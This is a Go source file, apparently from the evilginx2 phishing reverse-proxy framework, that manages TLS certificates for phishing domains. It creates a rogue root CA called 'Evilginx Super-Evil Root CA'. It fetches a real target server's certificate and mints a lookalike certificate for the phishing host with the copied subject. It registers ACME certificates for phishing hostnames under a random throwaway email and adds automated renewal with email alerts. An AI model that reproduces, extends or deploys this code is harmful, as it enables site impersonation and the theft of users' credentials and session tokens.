package core

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	"math/big"
	"net"
	"net/smtp"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/log"

	"github.com/caddyserver/certmagic"
)

type CertDb struct {
	cache_dir string
	magic     *certmagic.Config
	cfg       *Config
	ns        *Nameserver
	caCert    tls.Certificate
	tlsCache  map[string]*tls.Certificate
}

func NewCertDb(cache_dir string, cfg *Config, ns *Nameserver) (*CertDb, error) {
	os.Setenv("XDG_DATA_HOME", cache_dir)

	o := &CertDb{
		cache_dir: cache_dir,
		cfg:       cfg,
		ns:        ns,
		tlsCache:  make(map[string]*tls.Certificate),
	}

	if err := os.MkdirAll(filepath.Join(cache_dir, "sites"), 0700); err != nil {
		return nil, err
	}

	certmagic.DefaultACME.Agreed = true
	certmagic.DefaultACME.Email = o.GetEmail()

	err := o.generateCertificates()
	if err != nil {
		return nil, err
	}
	err = o.reloadCertificates()
	if err != nil {
		return nil, err
	}

	o.magic = certmagic.NewDefault()

	return o, nil
}

func (o *CertDb) GetEmail() string {
	var email string
	fn := filepath.Join(o.cache_dir, "email.txt")

	data, err := ReadFromFile(fn)
	if err != nil {
		email = strings.ToLower(GenRandomString(3) + "@" + GenRandomString(6) + ".com")
		if SaveToFile([]byte(email), fn, 0600) != nil {
			log.Error("saving email error: %s", err)
		}
	} else {
		email = strings.TrimSpace(string(data))
	}
	return email
}

func (o *CertDb) generateCertificates() error {
	var key *rsa.PrivateKey

	pkey, err := ioutil.ReadFile(filepath.Join(o.cache_dir, "private.key"))
	if err != nil {
		pkey, err = ioutil.ReadFile(filepath.Join(o.cache_dir, "ca.key"))
	}

	if err != nil {
		// private key corrupted or not found, recreate and delete all public certificates
		os.RemoveAll(filepath.Join(o.cache_dir, "*"))

		key, err = rsa.GenerateKey(rand.Reader, 2048)
		if err != nil {
			return fmt.Errorf("private key generation failed")
		}
		pkey = pem.EncodeToMemory(&pem.Block{
			Type:  "RSA PRIVATE KEY",
			Bytes: x509.MarshalPKCS1PrivateKey(key),
		})
		err = ioutil.WriteFile(filepath.Join(o.cache_dir, "ca.key"), pkey, 0600)
		if err != nil {
			return err
		}
	} else {
		block, _ := pem.Decode(pkey)
		if block == nil {
			return fmt.Errorf("private key is corrupted")
		}

		key, err = x509.ParsePKCS1PrivateKey(block.Bytes)
		if err != nil {
			return err
		}
	}

	ca_cert, err := ioutil.ReadFile(filepath.Join(o.cache_dir, "ca.crt"))
	if err != nil {
		notBefore := time.Now()
		aYear := time.Duration(10*365*24) * time.Hour
		notAfter := notBefore.Add(aYear)
		serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
		serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
		if err != nil {
			return err
		}

		template := x509.Certificate{
			SerialNumber: serialNumber,
			Subject: pkix.Name{
				Country:            []string{},
				Locality:           []string{},
				Organization:       []string{"Evilginx Signature Trust Co."},
				OrganizationalUnit: []string{},
				CommonName:         "Evilginx Super-Evil Root CA",
			},
			NotBefore:             notBefore,
			NotAfter:              notAfter,
			KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,
			ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth, x509.ExtKeyUsageServerAuth},
			BasicConstraintsValid: true,
			IsCA:                  true,
		}

		cert, err := x509.CreateCertificate(rand.Reader, &template, &template, &key.PublicKey, key)
		if err != nil {
			return err
		}
		ca_cert = pem.EncodeToMemory(&pem.Block{
			Type:  "CERTIFICATE",
			Bytes: cert,
		})
		err = ioutil.WriteFile(filepath.Join(o.cache_dir, "ca.crt"), ca_cert, 0600)
		if err != nil {
			return err
		}
	}

	o.caCert, err = tls.X509KeyPair(ca_cert, pkey)
	if err != nil {
		return err
	}
	return nil
}

func (o *CertDb) setManagedSync(hosts []string, t time.Duration) error {
	ctx, cancel := context.WithTimeout(context.Background(), t)
	err := o.magic.ManageSync(ctx, hosts)
	cancel()
	return err
}

func (o *CertDb) setUnmanagedSync(verbose bool) error {
	sitesDir := filepath.Join(o.cache_dir, "sites")

	files, err := os.ReadDir(sitesDir)
	if err != nil {
		return fmt.Errorf("failed to list certificates in directory '%s': %v", sitesDir, err)
	}

	for _, f := range files {
		if f.IsDir() {
			certDir := filepath.Join(sitesDir, f.Name())

			certFiles, err := os.ReadDir(certDir)
			if err != nil {
				return fmt.Errorf("failed to list certificate directory '%s': %v", certDir, err)
			}

			var certPath, keyPath string

			var pemCnt, crtCnt, keyCnt int
			for _, cf := range certFiles {
				//log.Debug("%s", cf.Name())
				if !cf.IsDir() {
					switch strings.ToLower(filepath.Ext(cf.Name())) {
					case ".pem":
						pemCnt += 1
						if certPath == "" {
							certPath = filepath.Join(certDir, cf.Name())
						}
						if cf.Name() == "fullchain.pem" {
							certPath = filepath.Join(certDir, cf.Name())
						}
						if cf.Name() == "privkey.pem" {
							keyPath = filepath.Join(certDir, cf.Name())
						}
					case ".crt":
						crtCnt += 1
						if certPath == "" {
							certPath = filepath.Join(certDir, cf.Name())
						}
					case ".key":
						keyCnt += 1
						if keyPath == "" {
							keyPath = filepath.Join(certDir, cf.Name())
						}
					}
				}
			}
			if pemCnt > 0 && crtCnt > 0 {
				if verbose {
					log.Warning("cert_db: found multiple .crt and .pem files in the same directory: %s", certDir)
				}
				continue
			}
			if certPath == "" {
				if verbose {
					log.Warning("cert_db: not a single public certificate found in directory: %s", certDir)
				}
				continue
			}
			if keyPath == "" {
				if verbose {
					log.Warning("cert_db: not a single private key found in directory: %s", certDir)
				}
				continue
			}

			log.Debug("caching certificate: cert:%s key:%s", certPath, keyPath)
			ctx := context.Background()
			_, err = o.magic.CacheUnmanagedCertificatePEMFile(ctx, certPath, keyPath, []string{})
			if err != nil {
				if verbose {
					log.Error("cert_db: failed to load certificate key-pair: %v", err)
				}
				continue
			}
		}
	}
	return nil
}

func (o *CertDb) reloadCertificates() error {
	// TODO: load private certificates from disk
	return nil
}

func (o *CertDb) getTLSCertificate(host string, port int) (*x509.Certificate, error) {
	log.Debug("Fetching TLS certificate for %s:%d ...", host, port)

	config := tls.Config{InsecureSkipVerify: true, NextProtos: []string{"http/1.1"}}
	conn, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", host, port), &config)
	if err != nil {
		return nil, err
	}
	defer conn.Close()

	state := conn.ConnectionState()

	return state.PeerCertificates[0], nil
}

func (o *CertDb) getSelfSignedCertificate(host string, phish_host string, port int) (cert *tls.Certificate, err error) {
	var x509ca *x509.Certificate
	var template x509.Certificate

	cert, ok := o.tlsCache[host]
	if ok {
		return cert, nil
	}

	if x509ca, err = x509.ParseCertificate(o.caCert.Certificate[0]); err != nil {
		return
	}

	if phish_host == "" {
		serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
		serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
		if err != nil {
			return nil, err
		}

		template = x509.Certificate{
			SerialNumber:          serialNumber,
			Issuer:                x509ca.Subject,
			Subject:               pkix.Name{Organization: []string{"Evilginx Signature Trust Co."}},
			NotBefore:             time.Now(),
			NotAfter:              time.Now().Add(time.Hour * 24 * 180),
			KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
			ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
			DNSNames:              []string{host},
			BasicConstraintsValid: true,
		}
		template.Subject.CommonName = host
	} else {
		srvCert, err := o.getTLSCertificate(host, port)
		if err != nil {
			return nil, fmt.Errorf("failed to get TLS certificate for: %s:%d error: %s", host, port, err)
		} else {
			serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
			serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
			if err != nil {
				return nil, err
			}

			template = x509.Certificate{
				SerialNumber:          serialNumber,
				Issuer:                x509ca.Subject,
				Subject:               srvCert.Subject,
				NotBefore:             srvCert.NotBefore,
				NotAfter:              time.Now().Add(time.Hour * 24 * 180),
				KeyUsage:              srvCert.KeyUsage,
				ExtKeyUsage:           srvCert.ExtKeyUsage,
				IPAddresses:           srvCert.IPAddresses,
				DNSNames:              []string{phish_host},
				BasicConstraintsValid: true,
			}
			template.Subject.CommonName = phish_host
		}
	}

	var pkey *rsa.PrivateKey
	if pkey, err = rsa.GenerateKey(rand.Reader, 1024); err != nil {
		return
	}

	var derBytes []byte
	if derBytes, err = x509.CreateCertificate(rand.Reader, &template, x509ca, &pkey.PublicKey, o.caCert.PrivateKey); err != nil {
		return
	}

	cert = &tls.Certificate{
		Certificate: [][]byte{derBytes, o.caCert.Certificate[0]},
		PrivateKey:  pkey,
	}

	o.tlsCache[host] = cert
	return cert, nil
}

func (o *CertDb) getAllCertDomains() []string {
	var domains []string
	siteHosts := o.cfg.GetAllSiteHostnames()
	domains = append(domains, siteHosts...)
	baseDomains := o.cfg.GetAllBaseDomains()
	for _, bd := range baseDomains {
		domains = append(domains, bd)
	}
	seen := make(map[string]bool)
	var unique []string
	for _, d := range domains {
		if d != "" && !seen[d] {
			seen[d] = true
			unique = append(unique, d)
		}
	}
	return unique
}

func (o *CertDb) CheckAndRenewCertificates() error {
	crc := o.cfg.GetCertRenewalConfig()
	if crc == nil || !crc.Enabled {
		return nil
	}
	renewDaysBefore := crc.RenewDaysBefore
	if renewDaysBefore <= 0 {
		renewDaysBefore = 30
	}
	renewThreshold := time.Duration(renewDaysBefore) * 24 * time.Hour

	domains := o.getAllCertDomains()
	if len(domains) == 0 {
		return nil
	}

	now := time.Now()
	var needsRenewal []string
	var renewalErrors []string

	for _, domain := range domains {
		cert, err := o.getTLSCertificate(domain, 443)
		if err != nil {
			log.Debug("cert_renewal: no existing cert for %s: %v", domain, err)
			needsRenewal = append(needsRenewal, domain)
			continue
		}
		timeLeft := cert.NotAfter.Sub(now)
		if timeLeft < renewThreshold {
			log.Info("cert_renewal: cert for %s expires in %v (needs renewal)", domain, timeLeft.Round(24*time.Hour))
			needsRenewal = append(needsRenewal, domain)
		} else {
			log.Debug("cert_renewal: cert for %s is valid for %v", domain, timeLeft.Round(24*time.Hour))
		}
	}

	if len(needsRenewal) == 0 {
		log.Debug("cert_renewal: no certificates need renewal")
		return nil
	}

	log.Info("cert_renewal: renewing %d certificate(s): %v", len(needsRenewal), needsRenewal)
	for _, domain := range needsRenewal {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
		err := o.magic.ManageAsync(ctx, []string{domain})
		cancel()
		if err != nil {
			msg := fmt.Sprintf("failed to renew cert for %s: %v", domain, err)
			log.Error("cert_renewal: %s", msg)
			renewalErrors = append(renewalErrors, msg)
		} else {
			log.Success("cert_renewal: successfully renewed certificate for %s", domain)
		}
	}

	if len(renewalErrors) > 0 && crc.EmailNotify != "" {
		subject := fmt.Sprintf("[Evilginx2] Certificate Renewal Failure - %s", time.Now().Format("2006-01-02"))
		body := fmt.Sprintf("Evilginx2 Certificate Renewal Report\nGenerated: %s\n\n", time.Now().Format(time.RFC3339))
		body += fmt.Sprintf("Renewal Interval: %d hours\n", crc.CheckInterval)
		body += fmt.Sprintf("Renew Threshold: %d days before expiry\n\n", renewDaysBefore)
		body += fmt.Sprintf("Domains Checked: %d\n", len(domains))
		body += fmt.Sprintf("Failed Renewals: %d\n\n", len(renewalErrors))
		body += "Error Details:\n"
		for i, e := range renewalErrors {
			body += fmt.Sprintf("%d. %s\n", i+1, e)
		}
		if err := o.sendRenewalEmail(crc, subject, body); err != nil {
			log.Error("cert_renewal: failed to send email notification: %v", err)
		} else {
			log.Info("cert_renewal: email notification sent to %s", crc.EmailNotify)
		}
	}

	if len(renewalErrors) > 0 {
		return fmt.Errorf("certificate renewal failed for: %s", strings.Join(renewalErrors, "; "))
	}
	return nil
}

func (o *CertDb) sendRenewalEmail(crc *CertRenewalConfig, subject string, body string) error {
	if crc.SmtpHost == "" || crc.EmailNotify == "" {
		return fmt.Errorf("SMTP host or notify email not configured")
	}
	smtpPort := crc.SmtpPort
	if smtpPort == 0 {
		smtpPort = 587
	}
	smtpHost := crc.SmtpHost

	from := crc.SmtpUser
	if from == "" {
		from = "evilginx2@localhost"
	}
	to := []string{crc.EmailNotify}

	headers := make(map[string]string)
	headers["From"] = from
	headers["To"] = crc.EmailNotify
	headers["Subject"] = subject
	headers["MIME-Version"] = "1.0"
	headers["Content-Type"] = "text/plain; charset=\"utf-8\""

	var msg string
	for k, v := range headers {
		msg += fmt.Sprintf("%s: %s\r\n", k, v)
	}
	msg += "\r\n" + body

	addr := net.JoinHostPort(smtpHost, strconv.Itoa(smtpPort))
	var auth smtp.Auth
	if crc.SmtpUser != "" && crc.SmtpPassword != "" {
		auth = smtp.PlainAuth("", crc.SmtpUser, crc.SmtpPassword, smtpHost)
	}

	conn, err := net.DialTimeout("tcp", addr, 15*time.Second)
	if err != nil {
		return fmt.Errorf("SMTP connect failed: %v", err)
	}
	defer conn.Close()

	client, err := smtp.NewClient(conn, smtpHost)
	if err != nil {
		return fmt.Errorf("SMTP client error: %v", err)
	}
	defer client.Quit()

	if auth != nil {
		if ok, _ := client.Extension("STARTTLS"); ok {
			if err := client.StartTLS(&tls.Config{ServerName: smtpHost}); err != nil {
				return fmt.Errorf("STARTTLS failed: %v", err)
			}
			if err := client.Auth(auth); err != nil {
				return fmt.Errorf("SMTP auth failed: %v", err)
			}
		} else {
			if err := client.Auth(auth); err != nil {
				return fmt.Errorf("SMTP auth failed: %v", err)
			}
		}
	}

	if err := client.Mail(from); err != nil {
		return fmt.Errorf("SMTP MAIL FROM error: %v", err)
	}
	for _, rcpt := range to {
		if err := client.Rcpt(rcpt); err != nil {
			return fmt.Errorf("SMTP RCPT TO error (%s): %v", rcpt, err)
		}
	}
	w, err := client.Data()
	if err != nil {
		return fmt.Errorf("SMTP DATA error: %v", err)
	}
	if _, err := w.Write([]byte(msg)); err != nil {
		return fmt.Errorf("SMTP write error: %v", err)
	}
	if err := w.Close(); err != nil {
		return fmt.Errorf("SMTP close error: %v", err)
	}
	return nil
}
